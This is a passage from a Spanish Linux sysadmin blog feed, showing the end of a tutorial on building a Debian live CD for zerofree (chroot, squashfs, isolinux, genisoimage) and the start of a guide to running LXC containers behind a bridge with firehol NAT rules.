I: Valid Release signature &lt;span class="o"&gt;(&lt;/span&gt;key id 75DDC3C4A499F1A18CB5F3C8CBF8D6FD518E17E1&lt;span class="o"&gt;)&lt;/span&gt;
I: Retrieving Packages 
I: Validating Packages 
I: Resolving dependencies of required packages...
I: Resolving dependencies of base packages...
...
I: Base system installed successfully.
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora se trata de preparar esta jaula con los paquetes que necesitemos y las configuraciones adecuadas. Vamos a montar los pseudo sistemas de ficheros &lt;em&gt;/proc&lt;/em&gt;, &lt;em&gt;/sys&lt;/em&gt;, &lt;em&gt;/dev&lt;/em&gt; y &lt;em&gt;/dev/pts&lt;/em&gt;, que posiblemente nos van a hacer falta cuando estemos dentro de la jaula.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# mount -o &lt;span class="nb"&gt;bind&lt;/span&gt; /proc/ chroot/proc/
root@desktop:~/live_boot# mount -o &lt;span class="nb"&gt;bind&lt;/span&gt; /sys/ chroot/sys/
root@desktop:~/live_boot# mount -o &lt;span class="nb"&gt;bind&lt;/span&gt; /dev/ chroot/dev/
root@desktop:~/live_boot# mount -o &lt;span class="nb"&gt;bind&lt;/span&gt; /dev/pts/ chroot/dev/pts/
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Entramos en la jaula:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# chroot chroot
root@desktop:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;CUIDADO&lt;/strong&gt;: A partir de ahora, y hasta nuevo aviso, todos los comandos se hacen &lt;strong&gt;dentro&lt;/strong&gt; de la jaula.&lt;/p&gt;
&lt;p&gt;Antes de nada, vamos a asignar una password al usuario &lt;em&gt;root&lt;/em&gt;, porque sino, no vamos a poder entrar en el &lt;em&gt;livecd&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:/# passwd    
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
root@desktop:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Asignamos el nombre de máquina que mostrará el &lt;em&gt;livecd&lt;/em&gt; una vez haya hecho el &lt;em&gt;boot&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:/# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;zerofree&amp;quot;&lt;/span&gt; &amp;gt; /etc/hostname
root@desktop:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para que el &lt;em&gt;livecd&lt;/em&gt; pueda hacer &lt;em&gt;boot&lt;/em&gt;, vamos a necesitar el paquete &lt;strong&gt;live-boot&lt;/strong&gt; y un &lt;em&gt;kernel&lt;/em&gt; adecuado a la máquina que va a usar el &lt;em&gt;livecd&lt;/em&gt;. El paquete del &lt;em&gt;kernel&lt;/em&gt; ya nos va a dotar de un &lt;em&gt;initrd&lt;/em&gt; que también vamos a necesitar para el &lt;em&gt;livecd&lt;/em&gt;. Este paso también tarda un poco.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:/# apt-get install linux-image-486 live-boot
Reading package lists... Done
Building dependency tree... Done
...
Setting up linux-image-3.16.0-4-586 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.16.7-ckt11-1+deb8u3&lt;span class="o"&gt;)&lt;/span&gt; ...
...  
/etc/kernel/postinst.d/initramfs-tools:
update-initramfs: Generating /boot/initrd.img-3.16.0-4-586
...
root@desktop:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a instalar los paquetes que queramos en el &lt;em&gt;livecd&lt;/em&gt;; yo voy a poner &lt;em&gt;zerofree&lt;/em&gt; que es la herramienta que motivó este &lt;em&gt;livecd&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:/# apt-get install zerofree
...
Unpacking zerofree &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.3-1&lt;span class="o"&gt;)&lt;/span&gt; ...
Setting up zerofree &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.3-1&lt;span class="o"&gt;)&lt;/span&gt; ...
root@desktop:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;OPCIONAL&lt;/strong&gt;: Para reducir el tamaño final, voy a limpiar todos los archivos temporales que usa &lt;em&gt;apt&lt;/em&gt;, tanto los archivos &lt;em&gt;.deb&lt;/em&gt; en &lt;em&gt;/var/cache/apt&lt;/em&gt;, como las listas de paquetes disponibles en &lt;em&gt;/var/lib/apt&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:/# cat /dev/null &amp;gt; /etc/apt/sources.list
root@desktop:/# apt-get update
Reading package lists... Done
root@desktop:/# apt-get clean 
root@desktop:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente salimos de la jaula:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:/# &lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;span class="nb"&gt;exit&lt;/span&gt;
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;CUIDADO&lt;/strong&gt;: A partir de ahora, todos los comandos se hacen &lt;strong&gt;fuera&lt;/strong&gt; de la jaula.&lt;/p&gt;
&lt;p&gt;Vamos a desmontar los pseudo sistemas de ficheros que ya no son necesarios, y que van a molestar cuando compactemos la jaula. Como apunte, la jaula había levantado un proceso &lt;em&gt;/usr/sbin/uuidd&lt;/em&gt; que evitaba desmontar &lt;em&gt;chroot/dev&lt;/em&gt;, por lo que tuve que finalizar el proceso con un &lt;em&gt;kill&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# umount chroot/dev/pts/
root@desktop:~/live_boot# umount chroot/dev/
root@desktop:~/live_boot# umount chroot/sys/
root@desktop:~/live_boot# umount chroot/proc/
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;OPCIONAL&lt;/strong&gt;: Sabiendo que mis máquinas virtuales son clones y el comando que va a correr siempre el comando &lt;em&gt;zerofree&lt;/em&gt; contra el disco &lt;em&gt;/dev/sda1&lt;/em&gt;, se puede poner los comandos en el &lt;em&gt;.bash_history&lt;/em&gt; de &lt;em&gt;root&lt;/em&gt; para poderlos recuperar mediante el uso de flechas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# cat chroot/root/.bash_history 
zerofree /dev/sda1
poweroff
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Empaquetando la imagen&lt;/h2&gt;
&lt;p&gt;Vamos a crear una carpeta contenedora, que va a servir como raíz del &lt;em&gt;livecd&lt;/em&gt;. Dentro le vamos a poner una carpeta &lt;em&gt;live&lt;/em&gt; (para el sistema de ficheros, el &lt;em&gt;kernel&lt;/em&gt; y el &lt;em&gt;initrd&lt;/em&gt;) y una carpeta &lt;em&gt;isolinux&lt;/em&gt; (para todo lo referente al &lt;em&gt;bootloader&lt;/em&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# mkdir -p image/&lt;span class="o"&gt;{&lt;/span&gt;live,isolinux&lt;span class="o"&gt;}&lt;/span&gt;
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a poner el sistema de ficheros en formato &lt;em&gt;SquashFS&lt;/em&gt;. Como apunte, el &lt;em&gt;kernel&lt;/em&gt; y el &lt;em&gt;initrd&lt;/em&gt; (ambos en la carpeta &lt;em&gt;/boot&lt;/em&gt;) se excluyen porque el &lt;em&gt;bootloader&lt;/em&gt; es incapaz de leerlos de allí; así que los copiamos a la misma carpeta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# mksquashfs chroot image/live/filesystem.squashfs -e boot
Parallel mksquashfs: Using &lt;span class="m"&gt;1&lt;/span&gt; processor
Creating &lt;span class="m"&gt;4&lt;/span&gt;.0 filesystem on image/live/filesystem.squashfs, block size &lt;span class="m"&gt;131072&lt;/span&gt;.
...  
root@desktop:~/live_boot# cp chroot/boot/vmlinuz-3.16.0-4-586 image/live/vmlinuz
root@desktop:~/live_boot# cp chroot/boot/initrd.img-3.16.0-4-586 image/live/initrd
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos con el &lt;em&gt;bootloader&lt;/em&gt;. Lo primero es poner una configuración para saber qué menú nos va a mostrar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# cat image/isolinux/isolinux.cfg 
UI menu.c32

prompt &lt;span class="m"&gt;0&lt;/span&gt;
menu title Debian Zerofree

timeout &lt;span class="m"&gt;50&lt;/span&gt;

label Debian Live &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-586
menu label ^Debian Live &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-586
menu default
kernel /live/vmlinuz
append &lt;span class="nv"&gt;initrd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/live/initrd &lt;span class="nv"&gt;boot&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;live
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Copiamos la imagen del &lt;em&gt;bootloader&lt;/em&gt; &lt;strong&gt;isolinux&lt;/strong&gt; y los módulos que se necesitan, tanto porque nuestra configuración los usa o porque se usan desde otros módulos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# cp /usr/lib/ISOLINUX/isolinux.bin image/isolinux/
root@desktop:~/live_boot# cp /usr/lib/syslinux/modules/bios/ldlinux.c32 image/isolinux/
root@desktop:~/live_boot# cp /usr/lib/syslinux/modules/bios/menu.c32 image/isolinux/
root@desktop:~/live_boot# cp /usr/lib/syslinux/modules/bios/libutil.c32 image/isolinux/
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente empaquetamos la imagen &lt;em&gt;.iso&lt;/em&gt;. Para ello usaremos la herramienta &lt;em&gt;genisoimage&lt;/em&gt; en la carpeta raíz de lo que sería el &lt;em&gt;livecd&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# &lt;span class="nb"&gt;cd&lt;/span&gt; image/
root@desktop:~/live_boot/image# genisoimage -rational-rock -volid &lt;span class="s2"&gt;&amp;quot;Debian Zerofree&amp;quot;&lt;/span&gt; -cache-inodes -joliet -full-iso9660-filenames -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size &lt;span class="m"&gt;4&lt;/span&gt; -boot-info-table -output ../debian-zerofree.iso .
I: -input-charset not specified, using utf-8 &lt;span class="o"&gt;(&lt;/span&gt;detected in locale settings&lt;span class="o"&gt;)&lt;/span&gt;
Size of boot image is &lt;span class="m"&gt;4&lt;/span&gt; sectors -&amp;gt; No emulation
  &lt;span class="m"&gt;9&lt;/span&gt;.24% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:43 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;18&lt;/span&gt;.48% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:38 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;27&lt;/span&gt;.69% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:36 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;36&lt;/span&gt;.94% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:38 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;46&lt;/span&gt;.15% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:37 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;55&lt;/span&gt;.40% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:36 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;64&lt;/span&gt;.61% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:37 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;73&lt;/span&gt;.85% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:37 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;83&lt;/span&gt;.07% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:37 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;92&lt;/span&gt;.30% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:38 &lt;span class="m"&gt;2015&lt;/span&gt;
Total translation table size: &lt;span class="m"&gt;2048&lt;/span&gt;
Total rockridge attributes bytes: &lt;span class="m"&gt;1335&lt;/span&gt;
Total directory bytes: &lt;span class="m"&gt;4570&lt;/span&gt;
Path table size&lt;span class="o"&gt;(&lt;/span&gt;bytes&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;38&lt;/span&gt;
Max brk space used 1a000
&lt;span class="m"&gt;54178&lt;/span&gt; extents written &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;105&lt;/span&gt; MB&lt;span class="o"&gt;)&lt;/span&gt;
root@desktop:~/live_boot/image# &lt;span class="nb"&gt;cd&lt;/span&gt; ..
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y nuestra imagen &lt;em&gt;.iso&lt;/em&gt; queda en la carpeta de trabajo, junto a la jaula y a la estructura del &lt;em&gt;livecd&lt;/em&gt;. Solo necesitamos la imagen &lt;em&gt;.iso&lt;/em&gt;, pero podemos dejar los ficheros intermedios hasta que estemos satisfechos con la imagen; es mas fácil modificar la jaula, el empaquetado &lt;em&gt;filesystem.squashfs&lt;/em&gt; y la imagen &lt;em&gt;.iso&lt;/em&gt; que volver a hacer un &lt;em&gt;debootstrap&lt;/em&gt; entero...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# ls -lh
total 106M
drwxr-xr-x &lt;span class="m"&gt;20&lt;/span&gt; root root &lt;span class="m"&gt;4&lt;/span&gt;,0K dic  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:30 chroot
-rw-r--r--  &lt;span class="m"&gt;1&lt;/span&gt; root root 106M dic  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06 debian-zerofree.iso
drwxr-xr-x  &lt;span class="m"&gt;4&lt;/span&gt; root root &lt;span class="m"&gt;4&lt;/span&gt;,0K dic  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:53 image
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusión&lt;/h2&gt;
&lt;p&gt;Copiando esta imagen &lt;em&gt;.iso&lt;/em&gt; a mi máquina con &lt;em&gt;VirtualBox&lt;/em&gt; y montándola antes de hacer el &lt;em&gt;boot&lt;/em&gt; de cada máquina, puedo usar la herramienta &lt;em&gt;zerofree&lt;/em&gt; libremente, sin instalarla en las máquinas virtuales. Tras ello, el compactado de los ficheros &lt;em&gt;.vdi&lt;/em&gt; libera los megabytes a cientos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@virtualbox:~/VirtualBox VMs$ VBoxManage modifyvdi Debian/Debian.vdi --compact
...
gerard@virtualbox:~/VirtualBox VMs$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso concreto, la máquina &lt;strong&gt;Debian&lt;/strong&gt; (&lt;em&gt;netinstall&lt;/em&gt;) volvió a ocupar 700 mb, que es mucho mas interesante teniendo en cuenta que es la imagen que suelo clonar para hacer otras máquinas virtuales.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="zerofree"></category><category term="debootstrap"></category><category term="squashfs"></category><category term="genisoimage"></category><category term="isolinux"></category><category term="iso"></category><category term="livecd"></category></entry><entry><title>Virtualizando contenedores LXC tras bridge interno</title><link href="http://www.linuxsysadmin.ml/2015/11/virtualizando-contenedores-lxc-tras-bridge-interno.html" rel="alternate"></link><published>2015-11-23T23:30:00+01:00</published><updated>2015-11-23T23:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-11-23:/2015/11/virtualizando-contenedores-lxc-tras-bridge-interno.html</id><summary type="html">&lt;p&gt;En un artículo anterior propusimos virtualizar contenedores en la red de la máquina &lt;em&gt;host&lt;/em&gt;. Sin embargo, puede ser mas interesante esconder los contenedores detrás de una máquina que haga las funciones de &lt;em&gt;host&lt;/em&gt; y de &lt;em&gt;firewall&lt;/em&gt;. Expondremos una serie de puertos tras la misma dirección &lt;em&gt;IP&lt;/em&gt; mediante el protocolo &lt;em&gt;NAT …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;En un artículo anterior propusimos virtualizar contenedores en la red de la máquina &lt;em&gt;host&lt;/em&gt;. Sin embargo, puede ser mas interesante esconder los contenedores detrás de una máquina que haga las funciones de &lt;em&gt;host&lt;/em&gt; y de &lt;em&gt;firewall&lt;/em&gt;. Expondremos una serie de puertos tras la misma dirección &lt;em&gt;IP&lt;/em&gt; mediante el protocolo &lt;em&gt;NAT&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para conseguir este objetivo, se van a usar las siguientes tecnologías:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Debian jessie&lt;/strong&gt;: Es necesario usar alguna distribución de linux para hacer funcionar LXC&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;LXC&lt;/strong&gt;: Tecnología que permite aislar los contenedores entre sí y darles entidad propia&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Bridges&lt;/strong&gt;: Un bridge es en software el equivalente a un switch hardware&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Firehol&lt;/strong&gt;: Una serie de scripts para construir firewalls basados en iptables de forma fácil&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;En cuanto a las capacidades hardware, vamos a hacer el tutorial con un equipo de capacidades modestas, virtualizado en una máquina virtual VirtualBox.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CPUs&lt;/strong&gt;: 1&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Memoria&lt;/strong&gt;: 256 Mb&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Disco&lt;/strong&gt;: 2 Gb&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Red&lt;/strong&gt;: 1 interfaz (&lt;em&gt;eth0&lt;/em&gt;) &lt;em&gt;host-only&lt;/em&gt; o &lt;em&gt;bridged&lt;/em&gt; con IP fija&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Partimos de una distribución &lt;em&gt;Debian jessie&lt;/em&gt; instalada con un CD &lt;em&gt;netinstall&lt;/em&gt; y con el único paquete instalado &lt;em&gt;openssh-server&lt;/em&gt;, para mi comodidad.&lt;/p&gt;
&lt;h2&gt;Preparar el servidor&lt;/h2&gt;
&lt;p&gt;El primer paso consiste en instalar las tecnologías usadas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# apt-get install bridge-utils firehol lxc
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias       
Leyendo la información de estado... Hecho
...
Configurando lxc &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;:1.0.6-6+deb8u2&lt;span class="o"&gt;)&lt;/span&gt; ...
Configurando dh-python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.20141111-2&lt;span class="o"&gt;)&lt;/span&gt; ...
Procesando disparadores para libc-bin &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.19-18+deb8u1&lt;span class="o"&gt;)&lt;/span&gt; ...
Procesando disparadores para systemd &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;215&lt;/span&gt;-17+deb8u2&lt;span class="o"&gt;)&lt;/span&gt; ...
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a modificar la configuración de red, para habilitar el &lt;em&gt;bridge&lt;/em&gt; en el que vamos a conectar el resto de contenedores virtualizados. Como dato importante, se define una interfaz falsa en la directiva &lt;em&gt;bridge_ports&lt;/em&gt; para que la &lt;em&gt;unit&lt;/em&gt; de red lo levante automáticamente.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ANTES&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /etc/network/interfaces
&lt;span class="nb"&gt;source&lt;/span&gt; /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address &lt;span class="m"&gt;192&lt;/span&gt;.168.56.4
    netmask &lt;span class="m"&gt;255&lt;/span&gt;.255.255.0
    gateway &lt;span class="m"&gt;192&lt;/span&gt;.168.56.1
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;DESPUES&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /etc/network/interfaces
&lt;span class="nb"&gt;source&lt;/span&gt; /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address &lt;span class="m"&gt;192&lt;/span&gt;.168.56.4
    netmask &lt;span class="m"&gt;255&lt;/span&gt;.255.255.0
    gateway &lt;span class="m"&gt;192&lt;/span&gt;.168.56.1

auto lxc0
iface lxc0 inet static
    bridge_ports dummy
    address &lt;span class="m"&gt;10&lt;/span&gt;.0.0.1
    netmask &lt;span class="m"&gt;255&lt;/span&gt;.255.255.0
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora toca reiniciar el servicio de red, para que el nuevo &lt;em&gt;bridge&lt;/em&gt; quede configurado como debe estarlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# service networking restart
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso consiste en poner las reglas de &lt;em&gt;firewall&lt;/em&gt; necesarias para proteger al equipo anfitrión y para permitirle actuar como &lt;em&gt;gateway&lt;/em&gt; para los contenedores tras el &lt;em&gt;bridge&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /etc/firehol/firehol.conf 
interface eth0 world
    policy drop
    protection strong
    server ssh accept
    client all accept

interface lxc0 lan
    policy drop
    client all accept

router lan2world inface lxc0 outface eth0
    masquerade
    route all accept
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hay que modificar otro fichero para permitir el inicio del &lt;em&gt;firewall&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ANTES&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# grep START /etc/default/firehol 
&lt;span class="c1"&gt;#To enable firehol at startup set START_FIREHOL=YES&lt;/span&gt;
&lt;span class="nv"&gt;START_FIREHOL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;NO
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;DESPUES&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# grep START /etc/default/firehol 
&lt;span class="c1"&gt;#To enable firehol at startup set START_FIREHOL=YES&lt;/span&gt;
&lt;span class="nv"&gt;START_FIREHOL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;YES
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y para acabar, reiniciamos el servicio &lt;em&gt;firehol&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# service firehol restart
...
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creación de contenedores&lt;/h2&gt;
&lt;p&gt;La creación de contenedores pasa por usar las herramientas estándar de la distribución, a lo solo tendremos que modificar algunas configuraciones propias de nuestra red.&lt;/p&gt;
&lt;p&gt;Creamos un contenedor &lt;em&gt;webserver&lt;/em&gt; como demostración. La primera que se crea es un poco lenta porque hace un &lt;em&gt;debootstrap&lt;/em&gt; de una distribución &lt;em&gt;Debian estable&lt;/em&gt; para crear una cache en &lt;em&gt;/var/cache/lxc&lt;/em&gt;; las siguientes se benefician de esta caché y solo la actualizan, acelerando el proceso.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-create -n webserver -t debian
debootstrap is /usr/sbin/debootstrap
Checking cache download in /var/cache/lxc/debian/rootfs-jessie-i386 ... 
Downloading debian minimal ...
...

I: Base system installed successfully.
Download complete.
Copying rootfs to /var/lib/lxc/webserver/rootfs...
...
Current default &lt;span class="nb"&gt;time&lt;/span&gt; zone: &lt;span class="s1"&gt;&amp;#39;Europe/Madrid&amp;#39;&lt;/span&gt;
Local &lt;span class="nb"&gt;time&lt;/span&gt; is now:      Mon Nov &lt;span class="m"&gt;23&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:29:36 CET &lt;span class="m"&gt;2015&lt;/span&gt;.
Universal Time is now:  Mon Nov &lt;span class="m"&gt;23&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:29:36 UTC &lt;span class="m"&gt;2015&lt;/span&gt;.

Root password is &lt;span class="s1"&gt;&amp;#39;E3+K9SpU&amp;#39;&lt;/span&gt;, please change !
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acabada la generación del contenedor, vamos a configurarle algunos parámetros; que tenga una interfaz &lt;em&gt;eth0&lt;/em&gt; activa y enchufada al bridge &lt;em&gt;lxc0&lt;/em&gt;, y que el contenedor se inicie automáticamente en cada reinicio del anfitrión.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /var/lib/lxc/webserver/config 
...
lxc.start.auto &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
lxc.network.type &lt;span class="o"&gt;=&lt;/span&gt; veth
lxc.network.flags &lt;span class="o"&gt;=&lt;/span&gt; up
lxc.network.link &lt;span class="o"&gt;=&lt;/span&gt; lxc0
lxc.network.name &lt;span class="o"&gt;=&lt;/span&gt; eth0
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


